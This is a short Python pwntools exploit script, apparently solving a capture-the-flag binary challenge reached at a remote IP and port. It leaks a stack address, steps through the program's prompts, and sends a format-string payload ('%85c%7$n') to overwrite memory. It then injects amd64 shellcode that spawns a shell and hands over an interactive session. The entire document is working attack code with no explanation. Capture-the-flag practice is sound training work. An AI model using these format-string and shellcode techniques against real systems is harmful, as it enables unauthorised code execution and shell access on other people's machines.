from pwn import *
#p = process("./str")
p = remote('111.198.29.45',35803)
p.recvuntil('secret[0] is ')
#p.recvuntil('secret[1] is ')
v3_addr=int(p.recv(7),16)

p.sendlineafter("What should your character's name be:","asd")
p.sendlineafter("So, where you will go?east or up?:","east")
p.sendlineafter("go into there(1), or leave(0)?:","1")
p.sendlineafter("'Give me an address'",str(v3_addr))

payload = "%85c%7$n"
#payload = "%68c%7$n"
p.sendlineafter("And, you wish is:",payload)

shellcode = asm(shellcraft.amd64.sh(),arch="amd64")
p.sendlineafter('Wizard: I will help you! USE YOU SPELL',shellcode)
p.interactive()
